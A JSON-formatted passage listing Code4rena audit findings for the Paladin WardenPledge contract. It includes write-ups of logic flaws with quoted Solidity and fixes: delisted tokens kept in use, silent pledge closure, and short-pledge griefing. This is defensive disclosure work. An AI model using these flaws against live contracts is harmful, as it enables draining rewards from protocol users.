"body": "Gas Optimizations"}, {"title": "Pledges that contain delisted tokens can be extended to continue using delisted reward tokens", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/145", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "sponsor confirmed", "selected for report", "M-04"], "target": "2022-10-paladin-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-paladin/blob/d6d0c0e57ad80f15e9691086c9c7270d4ccfe0e6/contracts/WardenPledge.sol#L368-L404   # Vulnerability details  ## Impact  Delisted reward tokens can continue to be use by extending current pledges that already use it  ## Proof of Concept      if(pledgeId >= pledgesIndex()) revert Errors.InvalidPledgeID();     address creator = pledgeOwner[pledgeId];     if(msg.sender != creator) revert Errors.NotPledgeCreator();       Pledge storage pledgeParams = pledges[pledgeId];     if(pledgeParams.closed) revert Errors.PledgeClosed();     if(pledgeParams.endTimestamp <= block.timestamp) revert Errors.ExpiredPledge();     if(newEndTimestamp == 0) revert Errors.NullEndTimestamp();     uint256 oldEndTimestamp = pledgeParams.endTimestamp;     if(newEndTimestamp != _getRoundedTimestamp(newEndTimestamp) || newEndTimestamp < oldEndTimestamp) revert Errors.InvalidEndTimestamp();       uint256 addedDuration = newEndTimestamp - oldEndTimestamp;     if(addedDuration < minDelegationTime) revert Errors.DurationTooShort();     uint256 totalRewardAmount = (pledgeParams.rewardPerVote * pledgeParams.votesDifference * addedDuration) / UNIT;     uint256 feeAmount = (totalRewardAmount * protocalFeeRatio) / MAX_PCT ;     if(totalRewardAmount > maxTotalRewardAmount) revert Errors.IncorrectMaxTotalRewardAmount();     if(feeAmount > maxFeeAmount) revert Errors.IncorrectMaxFeeAmount();  During the input validation checks, it's never checked that reward token of the pledge being extended is still a valid reward token. This would allow creators using delisted tokens to continue using them as long as they wanted, by simply extending their currently active pledges.  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Add the following check during the input validation block:      +   if(minAmountRewardToken[rewardToken] == 0) revert Errors.TokenNotWhitelisted();"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/140", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-38"], "target": "2022-10-paladin-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/138", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-37"], "target": "2022-10-paladin-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/137", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-22"], "target": "2022-10-paladin-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/136", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-36"], "target": "2022-10-paladin-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/135", "labels": ["bug", "G (Gas Optimization)", "high quality report", "grade-a", "G-21"], "target": "2022-10-paladin-findings", "body": "Gas Optimizations"}, {"title": "User who pledge can loose their boost and receive no reward without any warning.", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/134", "labels": ["bug", "downgraded by judge", "QA (Quality Assurance)", "grade-b", "Q-35"], "target": "2022-10-paladin-findings", "body": "User who pledge can loose their boost and receive no reward without any warning."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/132", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden", "grade-b", "Q-34"], "target": "2022-10-paladin-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/129", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-33"], "target": "2022-10-paladin-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/128", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-20"], "target": "2022-10-paladin-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/127", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-19"], "target": "2022-10-paladin-findings", "body": "Gas Optimizations"}, {"title": "ClosePledge() event is not emitted when setting the Pledge as closed.", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/125", "labels": ["bug", "downgraded by judge", "QA (Quality Assurance)", "grade-b", "Q-32"], "target": "2022-10-paladin-findings", "body": "ClosePledge() event is not emitted when setting the Pledge as closed."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/124", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-18"], "target": "2022-10-paladin-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/123", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden", "grade-b", "Q-31"], "target": "2022-10-paladin-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/122", "labels": ["bug", "QA (Quality Assurance)", "grade-a", "Q-30"], "target": "2022-10-paladin-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/121", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-17"], "target": "2022-10-paladin-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/119", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-16"], "target": "2022-10-paladin-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/115", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden", "grade-a", "Q-29"], "target": "2022-10-paladin-findings", "body": "QA Report"}, {"title": "Pledge can be silently closed by calling retrievePledgeRewards.", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/111", "labels": ["bug", "downgraded by judge", "QA (Quality Assurance)", "satisfactory", "sponsor confirmed", "edited-by-warden", "grade-b", "Q-28"], "target": "2022-10-paladin-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-paladin/blob/main/contracts/WardenPledge.sol#L451-L452 https://github.com/code-423n4/2022-10-paladin/blob/main/contracts/WardenPledge.sol#L469   # Vulnerability details  ## Impact Pledge can be silently closed by calling retrievePledgeRewards.  ## Proof of Concept The comments for `retrievePledgeRewards` says: https://github.com/code-423n4/2022-10-paladin/blob/main/contracts/WardenPledge.sol#L451-L452 ```     /**     * @notice Retrieves all non distributed rewards from a closed Pledge     * @dev Retrieves all non distributed rewards from a closed Pledge & send them to the given receiver     * @param pledgeId ID fo the Pledge     * @param receiver Address to receive the remaining rewards     */ ``` There's no line of code in `retrievePledgeRewards` method to ensure the pledge is indeed closed, instead the pledge is set to `closed` state if it is not closed. https://github.com/code-423n4/2022-10-paladin/blob/main/contracts/WardenPledge.sol#L469 ```solidity if(!pledgeParams.closed) pledgeParams.closed = true;  ``` This implementation doesn't follow the sepc and the pledge is closed silently(without triggering the `ClosePledge` event) if the pledge is not closed, which could lead to the pledge creator unexpectedly close the pledge that he doesn't intend to.  ## Tools Used manual review  ## Recommended Mitigation Steps `retrievePledgeRewards` can only retrieve distribution rewards from a closed pledge. ```solidity function retrievePledgeRewards(uint256 pledgeId, address receiver) external whenNotPaused nonReentrant {        ......          // Get the current remaining amount of rewards not distributed for the Pledge         uint256 remainingAmount = pledgeAvailableRewardAmounts[pledgeId];          if (!pledgeParams.closed) revert Errors.PledgeNotClosed();          if(remainingAmount > 0) {             // Transfer the non used rewards and reset storage             pledgeAvailableRewardAmounts[pledgeId] = 0;              IERC20(pledgeParams.rewardToken).safeTransfer(receiver, remainingAmount);              emit RetrievedPledgeRewards(pledgeId, receiver, remainingAmount);          }     } ```"}, {"title": "Lack of minimum pledge time requirement", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/110", "labels": ["bug", "downgraded by judge", "QA (Quality Assurance)", "sponsor confirmed", "grade-a", "Q-27"], "target": "2022-10-paladin-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-paladin/blob/d6d0c0e57ad80f15e9691086c9c7270d4ccfe0e6/contracts/WardenPledge.sol#L233-L237   # Vulnerability details  ## Impact The `_pledge()` function contains checks ensuring that the `endTimestamp` is not greater than the `pledgeParams.endTimestamp` and that `endTimestamp` is rounded to the week, but it does not check that `endTimestamp` is larger than some minimum pledge time. Currently, an \"attacker\" or griefer can pledge a large amount for a small amount of time. They can pledge for a length of time where the receiver may not even have enough time to submit a transaction to take advantage of the boost.  This most likely will not provide a large monetary incentive to the attacker, but the pledge creator's reward funds will be paid out for no reason.  ## Proof of Concept - A malicious actor realizes that the week timestamp is approaching in 10 minutes.  - They pledge a large amount of points to the pledge creator with the `endTimestamp` equal to the upcoming week timestamp (10 minutes away). - The receiver doesn't feasibly have enough time to act while the boost is active.  - The malicious actor receives some reward without providing any benefit to the receiver.  ## Tools Used  ## Recommended Mitigation Steps Add a check for `MIN_PLEDGE_TIME`, a constant equal to a value that makes sense, e.g. 86400 (1 day)."}, {"title": "Contract doesn't support fee-on-transfer tokens", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/108", "labels": ["bug", "downgraded by judge", "QA (Quality Assurance)", "grade-b", "Q-26"], "target": "2022-10-paladin-findings", "body": "Contract doesn't support fee-on-transfer tokens"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/107", "labels": ["bug", "QA (Quality Assurance)", "grade-a", "Q-25"], "target": "2022-10-paladin-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/104", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-15"], "target": "2022-10-paladin-findings", "body": "Gas Optimizations"}]